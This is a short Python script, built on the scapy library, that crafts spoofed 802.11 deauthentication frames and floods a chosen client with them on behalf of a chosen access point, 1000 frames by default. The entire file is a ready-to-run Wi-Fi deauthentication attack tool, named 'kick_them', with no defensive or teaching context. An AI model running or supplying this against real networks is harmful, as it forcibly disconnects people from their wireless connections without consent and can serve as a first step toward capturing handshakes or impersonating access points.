#!/usr/bin/python

from scapy.all import *
import sys
import optparse


def kick_them(iface, ap, cp, count):
    frame = RadioTap() / Dot11(addr1=cp, addr2=ap, addr3=ap) / Dot11Deauth()
    sendp(frame, iface=iface, count=count, inter=.1)


def main():
    parser = optparse.OptionParser()
    parser.add_option('-c', '--client', dest='tgt', help='client mac address', type='string')
    parser.add_option('-a', dest='ap', help='access point mac address', type='string')
    parser.add_option('-i', dest='inface', type='string', help=' the interface to use')
    parser.add_option('-n', dest='num', type='int', help='number of packets to send Default is 1000', default=1000)
    (options, args) = parser.parse_args()

    cli = options.tgt
    ap = options.ap
    inface = options.inface
    num = options.num

    if ap is None or cli is None or inface is None:
        parser.print_help()
        exit(0)
    else:
        kick_them(inface, ap, cli, num)


main()
